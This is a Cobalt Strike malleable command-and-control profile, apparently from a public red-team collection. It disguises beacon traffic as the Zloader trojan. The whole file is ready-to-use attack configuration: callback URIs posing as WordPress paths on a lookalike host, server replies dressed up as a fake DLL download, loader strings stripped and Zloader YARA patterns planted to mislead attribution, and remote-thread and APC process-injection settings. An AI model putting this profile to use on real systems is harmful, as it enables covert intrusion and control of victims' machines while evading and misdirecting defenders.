#zloader.profile
#https://app.any.run/tasks/7c83ff58-4c40-4a41-958b-d9279b917f2b/
#https://blog.malwarebytes.com/cybercrime/2017/01/zbot-with-legitimate-applications-on-board/

#xx0hcd

###Global Options###
set sample_name "zloader.profile";

set sleeptime "37500";
set jitter    "26";
set useragent "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36";

set host_stage "true";

###DNS options###
set dns_idle "8.8.8.8";
set maxdns    "245";
set dns_sleep "0";
set dns_stager_prepend "";
set dns_stager_subhost "";
set dns_max_txt "252";
set dns_ttl "1";

###SMB options###
set pipename "ntsvcs";
set pipename_stager "scerpc";

###TCP options###
set tcp_port "8000";

###SSL Options###

#https-certificate {
    #set keystore "";
    #set password "";
#}

#https-certificate {
#    set C "US";
#    set CN "whatever.com";
#    set L "California";
#    set O "whatever LLC.";
#    set OU "local.org";
#    set ST "CA";
#    set validity "365";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
#http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
#    set trust_x_forwarded_for "false";
#}

###HTTP-GET Block###
 
http-get {

    set uri "/wp-content/themes/calliope/wp_data.php";

    client {

        header "Accept" "*/*";
        header "Host" "wmwifbajxxbcxmucxmlc.com";
        header "Connection" "Keep-Alive";

	   
    metadata {

        base64url;
        prepend "SESSIONID=";
        header "Cookie";

    }

    }

    server {
        header "Server" "nginx";
        header "Content-Type" "application/x-msdos-program";
        header "Connection" "close";
        header "Last-Modified" "Fri, 24 Apr 2020 23:06:05 GMT";
        header "ETag" "\"76200-5a41168e83140\"";
        header "Accept-Ranges" "bytes";
 
        output {

            netbios;
            	       
	    prepend "MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.

$.......PE..L...$..^...........!................9+....................................................@..................................$..P.......X...............................8...............................@............................................text............................... ..`.rdata..6N.......P..................@..@.data...`....0...$..................@....rsrc...X............@..............@..@.reloc...............H..............@..B................................................................................................................................................................................................................................................................................................................................................................................................................................................................h.........Y.....h.........Y.....h.........Y......D$..V........t	V..........^.....D$..T$....H.......T$.....t$.R.P..T$..H.;J.u...;.u.........2.....................D$.;H.u
..;D$.u......2...........4.............QV.t$..D$...........t$........4...E..F......F.........:.u.3.QR.........^Y.....W.y...A..u.+._QR.........^Y.........4.............Q.D$...$....V.t$....u&j..F........F.....h.4......K.....^Y...PV.=.....^Y...........5.............QV.t$..D$......P....t$........4...E..F......F.........:.u.3.QR.........^Y.....W.y...A..u.+._QR.........^Y.......V.t$.V...........D$..0t..@.tR..^....@.pR..^..........
'R.......S...C..V.5 C..+....L$...C...
,R.........+R.....f.D$..P...W.=";

	    append "p....D$...C.....C...D$$6....L$..........;.r.(.\"R.....+........@+....C....+.+.........5 C....!...u....C..k..+...U....+....f9T$.w............$R....E.......C..k
.C.....v+..C...D$...C...D$..8....D$.+...C.......:.........&R....
\"R..........u...C....E......C.........*
.C......L$..
,R....@+
.C...
.C....
0R..It6..*t(......t............C.....D$.....:..C...	.\\$............u...]......@..C..+\\$....L$.*.....L$..
,R....@+......C...|$ Z...u...
(R....+.......5 C...L$...T.
..|$ Z....9u...
(R....+.......5 C...D$....@+L$..L$$....L$........=p..._^[...............S.$.U.l$.VW.{...;.......+.9|$..B|$.;.u.../9F........~...F.r...U......j......_..^][.............F.;.s..v.W.A.....tj.{..r....~..r*...(..u..~....r..._.....^][..._..^][..........t.W..+PQ.........~...~.r.....8..._^][.......8._..^][...hd........hd........hT....j...............S.\\$.V....tW.N....r.......;.rE...r........F...;.v1...r..t$.....+.SV.....^[....t$.....+.SV.....^[...W.|$....wz.F.;.s..v...W.!.....t\\.~..r(...&..u..~....r
.._.....^[....._^[..........t.WSP.........~...~.r.....8..._^[.......8._..^[...hT....m..................V...L$.W.~.;.r{.T$...+.;.w!.~...N.r
.._......^....._^.........tC.~..r.......+.S.....+.t.P...PS.........~...~.[r
....8..._^.......8._..^...hd....................U..j.h@...d.....P...SVW..0..3.P.E.d......e....u..E.........v....'.^..............;.v.......<.+.;.v.......O..E.....3..E...tF...w.Q.........E...u1......E..M..E.@.e.P.E........E..%.....}..E..u..E..]...tH.~..r1.../.u..~..r
.6........j..F......F.....j.............t.SQP.........~..r
.6.........E.......~..^....r........M.d.
....Y_^[..].......D$.3...t....w.P.,..........t............U...=..........t..M.9.t
....x..u.3.]..@.].U...=,.....(...t..M.9.t
....x..u.3.]..@.].U..V.u...............^]...U..V.u....A...........^]...U..V.u....&...........^]...U..V.u..........(.....^]...................U..V..............E..t.V.I...Y..^]...U..V........E..t.V.*...Y..^]...U.....j..E..E.....P.M..t...h.....E..E.....P.>....U......E..M..E..E.P.!...h.....E..E.....P......U......E..M..E..E.P.....h.....E..E.(...P......;";

            print;
        }
    }
}

#HTTP-GET VARIANT
http-get "variant_april24dll" {
 
    set uri "/files/april24.dll";

    client {

        header "Accept" "*/*";
        header "Host" "wmwifbajxxbcxmucxmlc.com";
        header "Connection" "Keep-Alive";

	   
    metadata {

        base64url;
        prepend "SESSIONID=";
        header "Cookie";

    }

    }

    server {
        header "Server" "nginx";
        header "Content-Type" "application/x-msdos-program";
        header "Connection" "close";
        header "Last-Modified" "Fri, 24 Apr 2020 23:06:05 GMT";
        header "ETag" "\"76200-5a41168e83140\"";
        header "Accept-Ranges" "bytes";
 
        output {

            netbios;
            	       
	    prepend "MZ......................@.............................................	.!..L.!This program cannot be run in DOS mode.

$.......PE..L...$..^...........!................9+....................................................@..................................$..P.......X...............................8...............................@............................................text............................... ..`.rdata..6N.......P..................@..@.data...`....0...$..................@....rsrc...X............@..............@..@.reloc...............H..............@..B................................................................................................................................................................................................................................................................................................................................................................................................................................................................h.........Y.....h.........Y.....h.........Y......D$..V........t	V..........^.....D$..T$....H.......T$.....t$.R.P..T$..H.;J.u...;.u.........2.....................D$.;H.u
..;D$.u......2...........4.............QV.t$..D$...........t$........4...E..F......F.........:.u.3.QR.........^Y.....W.y...A..u.+._QR.........^Y.........4.............Q.D$...$....V.t$....u&j..F........F.....h.4......K.....^Y...PV.=.....^Y...........5.............QV.t$..D$......P....t$........4...E..F......F.........:.u.3.QR.........^Y.....W.y...A..u.+._QR.........^Y.......V.t$.V...........D$..0t..@.tR..^....@.pR..^..........
'R.......S...C..V.5 C..+....L$...C...
,R.........+R.....f.D$..P...W.=";

	    append "p....D$...C.....C...D$$6....L$..........;.r.(.\"R.....+........@+....C....+.+.........5 C....!...u....C..k..+...U....+....f9T$.w............$R....E.......C..k
.C.....v+..C...D$...C...D$..8....D$.+...C.......:.........&R....
\"R..........u...C....E......C.........*
.C......L$..
,R....@+
.C...
.C....
0R..It6..*t(......t............C.....D$.....:..C...	.\\$............u...]......@..C..+\\$....L$.*.....L$..
,R....@+......C...|$ Z...u...
(R....+.......5 C...L$...T.
..|$ Z....9u...
(R....+.......5 C...D$....@+L$..L$$....L$........=p..._^[...............S.$.U.l$.VW.{...;.......+.9|$..B|$.;.u.../9F........~...F.r...U......j......_..^][.............F.;.s..v.W.A.....tj.{..r....~..r*...(..u..~....r..._.....^][..._..^][..........t.W..+PQ.........~...~.r.....8..._^][.......8._..^][...hd........hd........hT....j...............S.\\$.V....tW.N....r.......;.rE...r........F...;.v1...r..t$.....+.SV.....^[....t$.....+.SV.....^[...W.|$....wz.F.;.s..v...W.!.....t\\.~..r(...&..u..~....r
.._.....^[....._^[..........t.WSP.........~...~.r.....8..._^[.......8._..^[...hT....m..................V...L$.W.~.;.r{.T$...+.;.w!.~...N.r
.._......^....._^.........tC.~..r.......+.S.....+.t.P...PS.........~...~.[r
....8..._^.......8._..^...hd....................U..j.h@...d.....P...SVW..0..3.P.E.d......e....u..E.........v....'.^..............;.v.......<.+.;.v.......O..E.....3..E...tF...w.Q.........E...u1......E..M..E.@.e.P.E........E..%.....}..E..u..E..]...tH.~..r1.../.u..~..r
.6........j..F......F.....j.............t.SQP.........~..r
.6.........E.......~..^....r........M.d.
....Y_^[..].......D$.3...t....w.P.,..........t............U...=..........t..M.9.t
....x..u.3.]..@.].U...=,.....(...t..M.9.t
....x..u.3.]..@.].U..V.u...............^]...U..V.u....A...........^]...U..V.u....&...........^]...U..V.u..........(.....^]...................U..V..............E..t.V.I...Y..^]...U..V........E..t.V.*...Y..^]...U.....j..E..E.....P.M..t...h.....E..E.....P.>....U......E..M..E..E.P.!...h.....E..E.....P......U......E..M..E..E.P.....h.....E..E.(...P......;";

            print;
        }
    }
}

###HTTP-Post Block###

#parameters from a similar sample = https://github.com/tatsui-geek/malware-traffic-analysis.net/blob/master/2016-12-30-Sundown-EK-1st-run-sends-Terdot.A-Zloader.pcap
http-post {
    
    set uri "/post.php";
    #set verb "GET";
    set verb "POST";

    client {

	header "Accept" "*/*";
        header "Cache-Control" "no-cache";
        header "Host" "wmwifbajxxbcxmucxmlc.com";
        header "Connection" "close";
	     
        
        output {
            base64url;
	    parameter "FE8hVs3";
	    
        }

        id {
	    base64url;
	    parameter "id";

        }
    }

    server {
    
        header "Server" "nginx";
        header "Content-Type" "text/html; charset=UTF-8";
        header "Connection" "close";

        output {
            netbios;
            
            prepend "..\"N ......0.9..5......Tb....\"shb.fL.....t....u.......s...D.{...Qv&5..v9mO...A.mY..@..xPWM..Z$..y.q,P....Nn~..O	.[..Lo..{.Z.....yKd.B..o.M>..J...~n.D0..Bm.:.Tx...	.@.3..!.%...BC.\\I.7C..U..X..D.4....h........'m......gXaQ..<.....X..]...%5.Fx.LO..D._I~.@$.R[..p...<";
            
            append ">2...........{..\"..~=....._...Nu...s.mm.....u..lV..r......g2)r.w.'G2.*Y.i.,.9...o...t..zhX.h....K=........AS";
            
            print;
        }
    }
}

###HTTP-Stager Block###
http-stager {

    set uri_x86 "/wp-content/themes/wp-front.php";
    set uri_x64 "/wp-content/themes/wp_data.php";

    client {
    
        header "Host" "wmwifbajxxbcxmucxmlc.com";
        header "Connection" "Keep-Alive";
	
    }

    server {
        
        header "Server" "nginx";
        header "Content-Type" "text/html; charset=UTF-8";
        header "Connection" "close";
	
	output {
	    
	    print;
	}

    }
}


###Malleable PE/Stage Block###

#filled this out best I could.
stage {
    set checksum        "0";
    set compile_time    "16 Apr 2020 17:56:00";
    set entry_point     "170000";
    set image_size_x86 "740000";
    set image_size_x64 "740000";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "false";
    set sleep_mask	"false";
    set stomppe	        "false";
    set obfuscate	"false";
    set rich_header     "";
    
    set sleep_mask "false";

    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #from yara strings = https://github.com/k-vitali/Malware-Misc-RE/blob/master/2020-03-20-zloader-generic-yara-vk.yar
    string "{EE 03 00 00 E9 03 00 00 EE 03 00 00 EF 03 00 00 F0 03 00 00 EE 03 00 00 EE 03 00 00 EA 03 00 00 EC 03 00 00 EB 03 00 00 ED 03 00 00}";
    string "{55 89 e5 53 57 56 8b ?? ?? 85 f6 74 ?? 8b ?? ?? 6a 00 53 e8 ?? ?? ?? ?? 83 c4 08 a8 01 75 ?? 8b ?? ?? ?? ?? ?? 89 f9 e8 ?? ?? ?? ?? 89 c1 0f ?? ?? 66 ?? ?? 66 ?? ?? 74 ?? bb 01 00 00 00 eb ?? 89 d8 99 f7 f9 0f ?? ?? ?? 8b ?? ?? 66 ?? ?? ?? 66 ?? ?? ?? 8d ?? ?? 74 ?? 8d ?? ?? 66 83 fa 5f 72 ?? 66 83 f8 0d 77 ?? ba 00 26 00 00 0f a3 c2 72 ?? eb ?? 31 f6 eb ?? 89 de eb ?? 8b ?? ?? 89 f0 5e 5f 5b 5d c3}
";

}

###Process Inject Block###
process-inject {

    #set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "false";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        CreateThread;
        CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\explorer.exe";
    set spawnto_x64 "%windir%\\sysnative\\explorer.exe";

    set obfuscate "false";

    set smartinject "false";

    set amsi_disable "false";

}
